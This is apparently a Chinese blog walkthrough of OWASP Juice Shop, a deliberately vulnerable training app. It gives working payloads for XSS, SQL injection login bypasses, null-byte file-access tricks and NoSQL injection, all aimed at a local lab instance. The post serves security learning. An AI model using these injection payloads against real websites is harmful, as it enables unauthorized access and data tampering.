@@ -1,0 +1,807 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script type="text/javascript" src="js/jquery.min.js"></script>
+<script type="text/javascript" src="js/spig.js"></script>
+<link rel="stylesheet" href="css/lib/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+
+
+<div id="spig" class="spig">
+    <div id="message"></div>
+    <div id="mumu" class="mumu"></div>
+</div>
+
+ 
+    
+
+    <title>owasp juice shop | 知秋’s blog</title>
+    <meta name="author" content="知秋">
+    
+    <meta name="description" content="知秋">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="owasp juice shop"/>
+    <meta property="og:site_name" content="知秋"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="知秋" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/tomorrow-night-blue.min.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+<script type="text/javascript" src="../../js/love.js"></script>  
+ 
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
+ 
+  
+<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/background1.JPG); background-repeat: no-repeat;
+  background-size: 100% 100%;">
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+   
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">知秋</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            Home
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            Reading
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            About
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            Search
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="../../images/touxiang.jpeg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">知秋</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    Home
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    Archives
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    Categories
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    Reading
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    About
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    Search
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/essay/">
+                    essay <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/ctf/">
+                    ctf <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/web/">
+                    web <span class="right">11</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/writeup/">
+                    writeup <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/knowledge/">
+                    knowledge <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/note/">
+                    note <span class="right">8</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/crypt/">
+                    crypt <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/vulnerability/">
+                    vulnerability <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/life/">
+                    life <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">Search</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+	<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+<script>
+(function($){$.fn.snow=function(options){var $flake=$('<div id="flake" />').css({'position':'absolute','top':'-50px'}).html('&#10052;'),documentHeight=$(document).height(),documentWidth=$(document).width(),defaults={minSize:10,maxSize:20,newOn:500,flakeColor:"#FFFFFF"},options=$.extend({},defaults,options);var interval=setInterval(function(){var startPositionLeft=Math.random()*documentWidth-100,startOpacity=0.5+Math.random(),sizeFlake=options.minSize+Math.random()*options.maxSize,endPositionTop=documentHeight-40,endPositionLeft=startPositionLeft-100+Math.random()*200,durationFall=documentHeight*10+Math.random()*5000;$flake.clone().appendTo('body').css({left:startPositionLeft,opacity:startOpacity,'font-size':sizeFlake,color:options.flakeColor}).animate({top:endPositionTop,left:endPositionLeft,opacity:0.2},durationFall,'linear',function(){$(this).remove()});},options.newOn);};})(jQuery);
+$.fn.snow({ minSize: 10, maxSize: 60, newOn: 1000, flakeColor: '#FFF' });
+</script>
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">Current page(Categories)</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/knowledge/">knowledge</a><a class="breadcrumb" href="/categories/knowledge/vulnerability/">vulnerability</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>owasp juice shop</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2018-03-15T00:53:00.000Z"><a href="/posts/6faad9f0.html">2018-03-15</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/knowledge/" class="chip pink lighten-1">knowledge</a>
+        
+            <a href="/tags/vulnerability/" class="chip pink lighten-1">vulnerability </a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#安装方法"><span class="section table-of-contents-text">安装方法</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#一颗星"><span class="section table-of-contents-text">一颗星</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Score-Board"><span class="section table-of-contents-text">Score Board</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Admin-Section"><span class="section table-of-contents-text">Admin Section</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Confidential-Document"><span class="section table-of-contents-text">Confidential Document</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Deprecated-Interface"><span class="section table-of-contents-text">Deprecated Interface</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Error-Handling"><span class="section table-of-contents-text">Error Handling</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Five-Star-Feedback"><span class="section table-of-contents-text">Five-Star Feedback</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Redirects-Tier-1"><span class="section table-of-contents-text">Redirects Tier 1</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XSS-Tier-1"><span class="section table-of-contents-text">XSS Tier 1</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Zero-Stars"><span class="section table-of-contents-text">Zero Stars</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#两颗星"><span class="section table-of-contents-text">两颗星</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Basket-Access"><span class="section table-of-contents-text">Basket Access</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Christmas-Special"><span class="section table-of-contents-text">Christmas Special</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Forgotten-Sales-Backup"><span class="section table-of-contents-text">Forgotten Sales Backup</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Login-Admin"><span class="section table-of-contents-text">Login Admin</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Password-Strength"><span class="section table-of-contents-text">Password Strength</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Reset-Jim’s-Password"><span class="section table-of-contents-text">Reset Jim’s Password</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Weird-Crypto"><span class="section table-of-contents-text">Weird Crypto</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#三颗星"><span class="section table-of-contents-text">三颗星</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Easter-Egg-Tier-1"><span class="section table-of-contents-text">Easter Egg Tier 1</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Eye-Candy"><span class="section table-of-contents-text">Eye Candy</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Forged-Feedback"><span class="section table-of-contents-text">Forged Feedback</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Forgotten-Developer-Backup"><span class="section table-of-contents-text">Forgotten Developer Backup</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Login-Bender"><span class="section table-of-contents-text">Login Bender</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Login-Bjoern"><span class="section table-of-contents-text">Login Bjoern</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Login-Jim"><span class="section table-of-contents-text">Login Jim</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Misplaced-Signature-File"><span class="section table-of-contents-text">Misplaced Signature File</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#NoSQL-Injection-Tier-1"><span class="section table-of-contents-text">NoSQL Injection Tier 1</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#NoSQL-Injection-Tier-2"><span class="section table-of-contents-text">NoSQL Injection Tier 2</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Payback-Time"><span class="section table-of-contents-text">Payback Time</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Product-Tampering"><span class="section table-of-contents-text">Product Tampering</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Reset-Bender’s-Password"><span class="section table-of-contents-text">Reset Bender’s Password</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Retrieve-Blueprint"><span class="section table-of-contents-text">Retrieve Blueprint</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Typosquatting-Tier-1"><span class="section table-of-contents-text">Typosquatting Tier 1</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Upload-Size"><span class="section table-of-contents-text">Upload Size</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Upload-Type"><span class="section table-of-contents-text">Upload Type</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#User-Credentials"><span class="section table-of-contents-text">User Credentials</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Vulnerable-Library"><span class="section table-of-contents-text">Vulnerable Library</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XSS-Tier-2"><span class="section table-of-contents-text">XSS Tier 2</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XSS-Tier-3"><span class="section table-of-contents-text">XSS Tier 3</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XXE-Tier-1"><span class="section table-of-contents-text">XXE Tier 1</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#四颗星"><span class="section table-of-contents-text">四颗星</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CSRF"><span class="section table-of-contents-text">CSRF</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Easter-Egg-Tier-2"><span class="section table-of-contents-text">Easter Egg Tier 2</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#JWT-Issues-Tier-1"><span class="section table-of-contents-text">JWT Issues Tier 1</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Login-CISO"><span class="section table-of-contents-text">Login CISO</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Redirects-Tier-2"><span class="section table-of-contents-text">Redirects Tier 2</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Reset-Bjoern’s-Password"><span class="section table-of-contents-text">Reset Bjoern’s Password</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Typosquatting-Tier-2"><span class="section table-of-contents-text">Typosquatting Tier 2</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XSS-Tier-4"><span class="section table-of-contents-text">XSS Tier 4</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XXE-Tier-2"><span class="section table-of-contents-text">XXE Tier 2</span></a></li></ol></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <p>闲来无事，搭个漏洞小靶场，玩一玩。</p>
+<a id="more"></a>
+<h1 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h1><p>在ubuntu下安装<br>1.先安装docker<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> apt-get install docker</span><br></pre></td></tr></table></figure></p>
+<p>2.安装owasp juice shop<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$docker</span> pull bkimminich/juice-shop</span><br></pre></td></tr></table></figure></p>
+<p>有点卡，下载失败可多次尝试<br>3.运行 juice shop<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$docker</span> run -d -p 3000:3000 bkimminich/juice-shop</span><br></pre></td></tr></table></figure></p>
+<p>4.访问虚拟机地址加3000端口</p>
+<h1 id="一颗星"><a href="#一颗星" class="headerlink" title="一颗星"></a>一颗星</h1><h2 id="Score-Board"><a href="#Score-Board" class="headerlink" title="Score Board"></a>Score Board</h2><p>在首页，查看源码，看了挺久，终于在购物篮的页面上看到了一个Scorer-Board的链接，点击进去，成功解决。</p>
+<h2 id="Admin-Section"><a href="#Admin-Section" class="headerlink" title="Admin Section"></a>Admin Section</h2><p>这关要求找到管理员的登入界面，用御剑等扫描一下没成功，直接根据任务的英文要求，输入administration，成功解决一关，看来要仔细读题目。</p>
+<h2 id="Confidential-Document"><a href="#Confidential-Document" class="headerlink" title="Confidential Document"></a>Confidential Document</h2><p>要求阅读机密文件。还是老思路先用扫描器扫一下还看一下有没有robots.txt，发现不行，到处找了，一下，偶然在<code>关于我们</code>的页面上发现了一些显眼的字眼 ，将其下载下来，一开始认为里面会有不可访问的页面，突然看到下载的链接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ftp/legal.md?md_debug=<span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
+<p>访问一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ftp/</span><br></pre></td></tr></table></figure></p>
+<p>成功</p>
+<h2 id="Deprecated-Interface"><a href="#Deprecated-Interface" class="headerlink" title="Deprecated Interface"></a>Deprecated Interface</h2><p>在投诉的页面上，提交一个xml小文件即可。具体原因查看源代码。</p>
+<h2 id="Error-Handling"><a href="#Error-Handling" class="headerlink" title="Error Handling"></a>Error Handling</h2><p>这关要求引发一个错误，在解决Confidential Document 这关时，访问机密文件时，就引发了。</p>
+<h2 id="Five-Star-Feedback"><a href="#Five-Star-Feedback" class="headerlink" title="Five-Star Feedback"></a>Five-Star Feedback</h2><p>在administration的管理页面中，就有删除五颗星的评分，就可以。</p>
+<h2 id="Redirects-Tier-1"><a href="#Redirects-Tier-1" class="headerlink" title="Redirects Tier 1"></a>Redirects Tier 1</h2><h2 id="XSS-Tier-1"><a href="#XSS-Tier-1" class="headerlink" title="XSS Tier 1"></a>XSS Tier 1</h2><p>实现xss，首先想到的是搜索框，直接输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"XSS"</span>)&lt;/script&gt;.</span><br></pre></td></tr></table></figure></p>
+<h2 id="Zero-Stars"><a href="#Zero-Stars" class="headerlink" title="Zero Stars"></a>Zero Stars</h2><p>在联系我的页面上有个评价，评价时，使用bp抓包，修改一下就ok。</p>
+<h1 id="两颗星"><a href="#两颗星" class="headerlink" title="两颗星"></a>两颗星</h1><h2 id="Basket-Access"><a href="#Basket-Access" class="headerlink" title="Basket Access"></a>Basket Access</h2><h2 id="Christmas-Special"><a href="#Christmas-Special" class="headerlink" title="Christmas Special"></a>Christmas Special</h2><p>在搜索框上，输入1’，出现报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"error"</span>: &#123;</span><br><span class="line">    <span class="string">"message"</span>: <span class="string">"SQLITE_ERROR: near \"'%'\": syntax error"</span>,</span><br><span class="line">    <span class="string">"stack"</span>: <span class="string">"SequelizeDatabaseError: SQLITE_ERROR: near \"'%'\": syntax error\n    at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n    at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n    at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n    at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)"</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"SequelizeDatabaseError"</span>,</span><br><span class="line">    <span class="string">"parent"</span>: &#123;</span><br><span class="line">      <span class="string">"errno"</span>: 1,</span><br><span class="line">      <span class="string">"code"</span>: <span class="string">"SQLITE_ERROR"</span>,</span><br><span class="line">      <span class="string">"sql"</span>: <span class="string">"SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"original"</span>: &#123;</span><br><span class="line">      <span class="string">"errno"</span>: 1,</span><br><span class="line">      <span class="string">"code"</span>: <span class="string">"SQLITE_ERROR"</span>,</span><br><span class="line">      <span class="string">"sql"</span>: <span class="string">"SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"sql"</span>: <span class="string">"SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从报错的语句可以知道后台sql数据库查询语句。<br>deletedAt该列的值为空的才会显示，而我们要加的是2014年的商品，肯定deletedAt值不为空，所以页面上显示不出来，通过构造查询语句注释掉deletedAt IS NULL，即可看到2014年圣诞节的商品。<br>最终<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">')) --</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Forgotten-Sales-Backup"><a href="#Forgotten-Sales-Backup" class="headerlink" title="Forgotten Sales Backup"></a>Forgotten Sales Backup</h2><p>只能下载md和pdf的文件，可以通过%00截断<br></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ftp/coupons_2013.md.bak%2500.md</span><br></pre></td></tr></table></figure>
+<h2 id="Login-Admin"><a href="#Login-Admin" class="headerlink" title="Login Admin"></a>Login Admin</h2><p>在administration的管理页面中，可以知道管理员的登入账号为<a href="mailto:admin@juice-sh.op" target="_blank" rel="noopener">admin@juice-sh.op</a>，弱口令猜测admin123,成功登入，解决此题和Password Strength</p>
+<h2 id="Password-Strength"><a href="#Password-Strength" class="headerlink" title="Password Strength"></a>Password Strength</h2><p>上题的方法解决</p>
+<h2 id="Reset-Jim’s-Password"><a href="#Reset-Jim’s-Password" class="headerlink" title="Reset Jim’s Password"></a>Reset Jim’s Password</h2><p>通过输入<code>jim@juice-sh.op</code> 邮箱，要社工查找<br>Your eldest siblings middle name?名，查找得到<br>George Samuel Kirk 输入Samuel，然后填密码即可。</p>
+<h2 id="Weird-Crypto"><a href="#Weird-Crypto" class="headerlink" title="Weird Crypto"></a>Weird Crypto</h2><p>在联系我的页面中的评价中，填写base64编码即可。</p>
+<h1 id="三颗星"><a href="#三颗星" class="headerlink" title="三颗星"></a>三颗星</h1><h2 id="Easter-Egg-Tier-1"><a href="#Easter-Egg-Tier-1" class="headerlink" title="Easter Egg Tier 1"></a>Easter Egg Tier 1</h2><p>在ftp下的 eastere.gg，然后下载，将其中的一段密文base64解密，在访问其解密后的路径即可</p>
+<h2 id="Eye-Candy"><a href="#Eye-Candy" class="headerlink" title="Eye Candy"></a>Eye Candy</h2><p>开启JavaScript console 输入命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">document.getElementById(<span class="string">"theme"</span>).setAttribute(<span class="string">"href"</span>,<span class="string">"css/geo-bootstrap/swatch/bootstrap.css"</span>);</span><br></pre></td></tr></table></figure></p>
+<h2 id="Forged-Feedback"><a href="#Forged-Feedback" class="headerlink" title="Forged Feedback"></a>Forged Feedback</h2><h2 id="Forgotten-Developer-Backup"><a href="#Forgotten-Developer-Backup" class="headerlink" title="Forgotten Developer Backup"></a>Forgotten Developer Backup</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/package.json.bak％2500.md将最终解决挑战。</span><br></pre></td></tr></table></figure>
+<h2 id="Login-Bender"><a href="#Login-Bender" class="headerlink" title="Login Bender"></a>Login Bender</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bender@juice-sh.op<span class="string">'--</span></span><br></pre></td></tr></table></figure>
+<h2 id="Login-Bjoern"><a href="#Login-Bjoern" class="headerlink" title="Login Bjoern"></a>Login Bjoern</h2><p>暴力破解哈希不可能。官方答案说解密的方法，就在登入页面上的源码中一个dist/juice-shop.min.js链接里。密码为邮箱的base64加密。</p>
+<h2 id="Login-Jim"><a href="#Login-Jim" class="headerlink" title="Login Jim"></a>Login Jim</h2><p>万能密码绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@juice-sh.op<span class="string">' or 1 and 1 --+</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Misplaced-Signature-File"><a href="#Misplaced-Signature-File" class="headerlink" title="Misplaced Signature File"></a>Misplaced Signature File</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/suspicious_errors.yml％2500.md</span><br></pre></td></tr></table></figure>
+<h2 id="NoSQL-Injection-Tier-1"><a href="#NoSQL-Injection-Tier-1" class="headerlink" title="NoSQL Injection Tier 1"></a>NoSQL Injection Tier 1</h2><p>要求让服务器休眠一段时间.<br>访问一下链接即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.239.128:3000/rest/product/sleep(100)/reviews</span><br></pre></td></tr></table></figure></p>
+<h2 id="NoSQL-Injection-Tier-2"><a href="#NoSQL-Injection-Tier-2" class="headerlink" title="NoSQL Injection Tier 2"></a>NoSQL Injection Tier 2</h2><p>同时更新所有的评论<br><br>向<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/rest/product/reviews</span><br></pre></td></tr></table></figure></p>
+<p>提交patch请求。<br>body为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123; <span class="string">"id"</span>: &#123; <span class="string">"<span class="variable">$ne</span>"</span>: -1 &#125;, <span class="string">"message"</span>: <span class="string">"NoSQL Injection!"</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>Headers为,其中Authorization,根据自己的去抓包值去修改。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conent-type:application/json</span><br><span class="line">Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwNzY3MDQsImV4cCI6MTUyMTA5NDcwNH0.vSA_fSFw1-yrRLYJatnIKmJvXYgBtvdI5pZOI1UNCVZ6_qtQ-hS2ETsvm_gi1p_d3E39Czc-__2GTtaE582C9jlrAOxmYiDNuzeM9PHxa8kd7hb40EAs6srD17vE_HDlU0LE-4VBUScjLPoRXWjQXM8QFC3_D9Eyc6FAM--T8TQ</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<h2 id="Payback-Time"><a href="#Payback-Time" class="headerlink" title="Payback Time"></a>Payback Time</h2><h2 id="Product-Tampering"><a href="#Product-Tampering" class="headerlink" title="Product Tampering"></a>Product Tampering</h2><h2 id="Reset-Bender’s-Password"><a href="#Reset-Bender’s-Password" class="headerlink" title="Reset Bender’s Password"></a>Reset Bender’s Password</h2><p>这道题需要社工，最后会查到<code>Stop&#39;n&#39;Drop</code>。</p>
